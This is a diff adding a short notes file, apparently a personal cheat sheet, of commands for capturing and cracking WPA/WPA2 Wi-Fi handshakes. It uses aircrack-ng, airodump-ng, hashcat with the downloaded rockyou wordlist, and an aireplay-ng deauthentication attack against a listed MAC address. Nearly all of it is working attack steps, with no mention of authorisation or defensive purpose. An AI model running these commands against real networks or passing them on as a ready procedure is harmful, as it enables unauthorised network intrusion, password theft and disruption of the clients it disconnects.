@@ -1,0 +1,58 @@
+apt-get install aircrack-ng
+airmon-ng    #show wlo1
+airmon-ng start wlo1
+iwconfig    #show wlo1mon
+airmon-ng check kill
+airodump-ng wlo1mon   #show all networks around 
+airodump-ng -c channel --bssid MAC -w /root/Desktop/ wlo1mon   #show clients connected to target network
+wait handshake
+exit airodump-ng  #ctrl+c
+then -01.cap show in /root/Desktop
+mv ./-01.cap name.cap
+convert .cap to .hccapx
+website: https://www.onlinehashcrack.com/tools-cap-to-hccapx-converter.php
+cap2hccapx.bin name.cap name.hccapx
+
+sudo git clone https://github.com/brannondorsey/naive-hashcat # install naive-hashcat  
+cd naive-hashcat
+curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+HASH_FILE=name.hccapx POT_FILE=name.pot HASH_TYPE=2500 ./naive-hashcat.sh  #run naive-hashcat
+naive-hashcat/name.pot #word or phrase after the last colon in the string is the password
+
+non-gpu
+curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+#download common used file  
+#aircrack-ng cannot to crack wpa/wpa2 if password not in word list
+aircrack-ng -a2 -b MAC -w /root/Desktop/rockyou.txt /root/Desktop/name.cap
+#replace -a2 with -a if use wpa   -w: location of wordlist
+
+#cannot connect to internet
+airmon-ng stop wlo1mon
+service NetworkManager restart   # restart network service
+systemctl restart network-manager.service
+
+
+force handshake via deauth attack
+airodump-ng -c channel --bssid MAC   #monitor network
+Once you see two MAC addresses appear next to each other 
+(and a string of text that includes a manufacturer name next to them), you can proceed.
+This indicates that a client (e.g., a computer) is now connected to the network.
+open new terminal windows
+aireplay-ng -0 2 -a MAC1 -c MAC2 wlan1mon   #send deauth package
+maybe simple way: aireplay-ng -0 10 -a 80:35:C1:13:C1:2C wlan0mon
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
